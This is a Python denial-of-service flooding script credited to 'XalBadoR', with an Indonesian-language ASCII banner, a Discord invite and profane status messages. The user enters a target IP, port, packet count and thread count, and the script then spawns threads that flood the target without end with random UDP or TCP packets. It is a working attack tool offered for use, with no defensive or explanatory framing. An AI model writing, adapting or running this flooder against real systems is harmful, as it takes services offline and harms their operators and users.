#!/usr/bin/env python3
#Semoga yang curi script yatim
#Ddos by XalBadoR
#Join My T3Am : https://discord.gg/fRDAvXsU
import random
import socket
import threading
import os

os.system("clear")
print("    ___________ _____  _     __   __ ")
print("   |___  /_   _|  ___|| |    \ \ / / ")
print("     / /  | | | |__   | |     \ V /  ")
print("    / /   | | |  __|  | |      > <   ")
print("   / /__ _| |_| |____ | |____ / . \  ")
print("  /_____|_____|______ |______/_/ \_\ ")
print("    |  __ \|  __ \ / __ \ / ____|    ")
print("    | |  | | |  | | |  | | (___      ")
print("    | |  | | |  | | |  | |\___ \     ")
print("    | |__| | |__| | |__| |____) |    ")   
print("    |_____/|_____/ \____/|_____/     ")

ip = str(input("Ip Target : "))
port = int(input("Port Target : "))
choice = str(input("Gas Gak Ngentot (y/n) : "))
times = int(input("Packets: "))
threads = int(input("Threads : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZIELXXX NIH NGENTOT!!")
		except:
			print("[!] Server Has Been Down ")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZIELXXX NIH NGENTOT!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
